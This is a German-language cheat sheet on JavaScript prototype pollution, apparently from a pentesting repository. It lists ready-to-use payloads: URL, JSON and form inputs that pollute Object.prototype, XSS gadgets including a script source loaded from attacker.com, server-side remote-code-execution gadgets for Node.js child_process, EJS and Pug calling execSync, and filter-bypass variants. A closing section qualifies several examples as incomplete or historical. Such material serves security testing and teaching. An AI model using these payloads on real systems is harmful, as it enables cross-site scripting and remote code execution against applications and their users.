# 🧬 Cheatsheet zu Prototype Pollution

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
  <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a> • <a href="README.el.md">🇬🇷 Ελληνικά</a>
</p>

```
  ██████╗ ██████╗  ██████╗ ████████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║   ██║    ╚████╔╝ ██████╔╝█████╗  
  ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██║   ██║   ██║     ╚██╔╝  ██╔═══╝ ██╔══╝  
  ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝   ██║      ██║   ██║     ███████╗
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝    ╚═╝      ╚═╝   ╚═╝     ╚══════╝
                 ██████╗  ██████╗ ██╗     ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
                 ██╔══██╗██╔═══██╗██║     ██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
                 ██████╔╝██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
                 ██╔═══╝ ██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
                 ██║     ╚██████╔╝███████╗███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
                 ╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## 🎯 Was ist Prototype Pollution?

**Prototype Pollution** (Manipulation von Prototypen) ist eine JavaScript-Schwachstelle, bei der ein Angreifer `Object.prototype` verändern kann und damit Objekte in der Anwendung beeinflusst.

### Auswirkungen
- 🔴 **XSS** – Manipulation des DOM
- 🔴 **RCE** – Serverseitige Codeausführung (Node.js)
- 🔴 **Umgehung** – Sicherheitskontrollen umgehen
- 🔴 **DoS** – Absturz der Anwendung

---

## 🔍 JavaScript-Prototypen

### Funktionsweise
```javascript
// Jedes Objekt erbt von Object.prototype
let obj = {};
obj.__proto__ === Object.prototype  // true

// Wenn wir den Prototyp manipulieren:
Object.prototype.polluted = "hacked";

// Alle Objekte sind betroffen:
let newObj = {};
console.log(newObj.polluted);  // "hacked"
```

### Gefährliche Eigenschaften
```javascript
__proto__
constructor
prototype
```

---

## 💉 Clientseitige Payloads

### Über die URL (Query/Hash)
```
# Grundlegendes Beispiel
?__proto__[polluted]=value
?__proto__.polluted=value

# Konstruktor
?constructor[prototype][polluted]=value

# Verschachtelt
?__proto__[__proto__][polluted]=value

# URL-kodiert
?__proto__%5Bpolluted%5D=value
```

### Über JSON
```javascript
// Benutzereingabe
{"__proto__": {"polluted": "value"}}
{"constructor": {"prototype": {"polluted": "value"}}}

// Verschachtelt
{"a": {"__proto__": {"polluted": "value"}}}
```

### Über Formulardaten
```html
<input name="__proto__[polluted]" value="hacked">
<input name="constructor[prototype][polluted]" value="hacked">
```

---

## 🔥 Beispiele zur Ausnutzung

### DOM-XSS über innerHTML
```javascript
// Wenn der Code Folgendes ausführt:
element.innerHTML = obj.html || "";

// Prototyp manipulieren:
?__proto__[html]=<img src=x onerror=alert(1)>

// Ergebnis: XSS!
```

### Gadget für Script-src
```javascript
// Wenn der Code Folgendes ausführt:
let script = document.createElement('script');
script.src = obj.src || '/default.js';

// Prototyp manipulieren:
?__proto__[src]=data:,alert(1)//
?__proto__[src]=//attacker.com/evil.js
```

### Kombination mit DOM Clobbering
```javascript
// Häufige Gadget-Muster
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[outerHTML]=<img src=x onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
```

### jQuery-Gadgets
```javascript
// jQuery < 3.4.0
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))

// Ausnutzung
?__proto__[url]=javascript:alert(1)
```

---

## 🖥️ Serverseitige Ausnutzung (Node.js)

### RCE über child_process
```javascript
// Wenn die Anwendung spawn/exec mit einem Optionsobjekt verwendet:
const { spawn } = require('child_process');
spawn('ls', [], options);

// Prototyp manipulieren:
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(1)"}}

// Oder:
{"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require /tmp/pwn.js"}}}
```

### RCE über require()
```javascript
// Payload zur Prototypmanipulation
{"__proto__": {"main": "./pwned.js"}}
```

### RCE über EJS-Templates
```javascript
// EJS (< 3.1.7) RCE
{"__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
}}
```

### RCE über Pug-Templates
```javascript
// Pug RCE
{"__proto__": {
    "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('id')"
    }
}}
```

---

## 🔍 Erkennung

### Manuelle Prüfung
```javascript
// In der Browserkonsole:
Object.prototype.testPollution = "polluted";
let obj = {};
console.log(obj.testPollution);  // Bei "polluted" = verwundbar

// Bereinigen
delete Object.prototype.testPollution;
```

### URL-Prüfung
```
# Zur URL hinzufügen und die Konsole prüfen
?__proto__[test]=polluted

// In der Konsole:
({}).test  // Sollte undefined sein; bei "polluted" = verwundbar
```

### Gadgets finden (DOM Invader)
```
1. DOM Invader installieren (Burp Suite)
2. Modus für Prototype Pollution aktivieren
3. Anwendung durchgehen
4. Auf ausnutzbare Sinks (gefährliche Verarbeitungsstellen) prüfen
```

---

## 🛠️ Werkzeuge

| Werkzeug | Zweck |
|------|---------|
| **DOM Invader** | Burp-Erweiterung zur Erkennung von Prototype Pollution |
| **ppfuzz** | Fuzzer für Prototype Pollution |
| **ppmap** | Suche nach Gadgets |
| **PPScan** | Clientseitiger Scanner |

### ppmap verwenden
```bash
# Installation
git clone https://github.com/nickvdyck/ppmap
cd ppmap

# Prüfung
node ppmap.js https://target.com
```

---

## 📊 Schnellübersicht

### Payload-Formate
| Format | Payload |
|--------|---------|
| Query | `?__proto__[x]=y` |
| Hash | `#__proto__[x]=y` |
| JSON | `{"__proto__":{"x":"y"}}` |
| Merge | `Object.assign({},input)` |

### Häufige Gadgets
| Eigenschaft | Auswirkung |
|----------|--------|
| `innerHTML` | XSS |
| `src` | Einschleusen von Skripten |
| `href` | Weiterleitung |
| `shell` | RCE (Node.js) |
| `env` | RCE (Node.js) |

### Techniken zur Umgehung von Filtern
```javascript
// Wenn __proto__ gefiltert wird:
constructor.prototype.polluted = "value"

// Andere Schreibweise
["__proto__"]["polluted"] = "value"

// Unicode
{"\u005f\u005fproto\u005f\u005f": {"x": "y"}}
```

---

## 📚 Ressourcen

- [PortSwigger Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [Server-side Prototype Pollution](https://portswigger.net/research/server-side-prototype-pollution)
- [Client-side PP Scanner](https://github.com/nickvdyck/ppmap)

---

## 📝 Ergänzende Hinweise zu den Originalbeispielen

- **Vererbung und Nachweis:** Nicht jedes Objekt erbt von Object.prototype; Objekte mit Null-Prototyp und eigene gleichnamige Eigenschaften sind wichtige Ausnahmen. Die direkte Zuweisung in der Browserkonsole zeigt normale JavaScript-Vererbung, nicht bereits eine über Benutzereingaben erreichbare Schwachstelle. Dafür muss ein unsicherer Datenfluss den Prototyp verändern; eine ausnutzbare Wirkung benötigt zusätzlich ein passendes Gadget. [MDN: Prototype Pollution](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution), [PortSwigger: Grundlagen](https://portswigger.net/web-security/prototype-pollution).
- **JSON und Merge:** JSON.parse erzeugt bei einem Schlüssel namens __proto__ zunächst eine gewöhnliche eigene Eigenschaft. Bei einem JavaScript-Objektliteral hat dieselbe Schreibweise eine besondere Bedeutung. Object.assign kann über den Setter den Prototyp des Zielobjekts ersetzen, ohne deshalb global Object.prototype zu verändern. URL- und Formularbeispiele setzen einen entsprechend unsicheren Parser oder Merge voraus. [MDN: Prototype Pollution](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).
- **Unvollständige Umgehungsbeispiele:** Die Schreibweise mit einem Array aus dem String __proto__ und anschließendem Zugriff auf polluted verändert nur eine Eigenschaft dieses neu erzeugten Arrays, keinen globalen Prototyp. Auch constructor muss auf das passende Objekt verweisen; die isolierte Zeile definiert diesen Bezug nicht. Die Vorlagen bleiben unverändert. Die Einordnung folgt aus der JavaScript-Auswertung von Arrayliteralen und Eigenschaftszugriffen. [ECMAScript: Array Initializer](https://tc39.es/ecma262/multipage/ecmascript-language-expressions.html#sec-array-initializer), [PortSwigger: Prototype-Pollution-Grundlagen](https://portswigger.net/web-security/prototype-pollution).
- **Clientseitige Gadgets:** Die genannten DOM-Eigenschaften oder URL-Werte führen nicht automatisch zu XSS. Entscheidend sind ein tatsächlich erreichbarer Sink, ein vererbter und verwendeter Wert sowie Browser- und Sicherheitskontext. DOM Clobbering ist ein eigener Mechanismus. jQuery 3.4.0 behob die gezeigte unsichere Verarbeitung von __proto__ in tiefen extend-Aufrufen; die weitere URL-Zeile ist damit noch keine vollständige Angriffskette. [PortSwigger: Clientseitige Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/client-side), [jQuery: Version 3.4.0](https://blog.jquery.com/2019/04/10/jquery-3-4-0-released/).
- **Serverseitige RCE:** Die Node.js-, require-, EJS- und Pug-Ausschnitte sind historische beziehungsweise verkürzte Gadget-Ideen. Sie setzen unter anderem eine erreichbare Pollution-Quelle, einen passenden Aufruf, verwendete geerbte Optionen sowie eine passende Laufzeit-/Bibliotheksversion voraus. Dateipfade müssen erreichbar sein; eine veränderte main-Eigenschaft oder die Versionsangabe bei EJS allein beweist keine Codeausführung. EJS warnt ausdrücklich davor, Endnutzern unbeschränkten Zugriff auf die Render-Funktion zu geben. [PortSwigger: Serverseitige Prototype Pollution](https://portswigger.net/web-security/prototype-pollution/server-side), [EJS: Sicherheits- und API-Hinweise](https://github.com/mde/ejs/blob/main/README.md).
- **DOM Invader:** Das Werkzeug ist im integrierten Burp-Browser als Browsererweiterung vorinstalliert; die Prototype-Pollution-Funktionen sind standardmäßig deaktiviert. Die Installationszeile der Vorlage ist daher verkürzt. [PortSwigger: DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader), [PortSwigger: Prototype-Pollution-Prüfung](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/prototype-pollution).

---

<p align="center">
  <b>🧬 Prototypen auf Manipulierbarkeit prüfen!</b><br>
  <i>Nur für autorisierte Tests!</i>
</p>
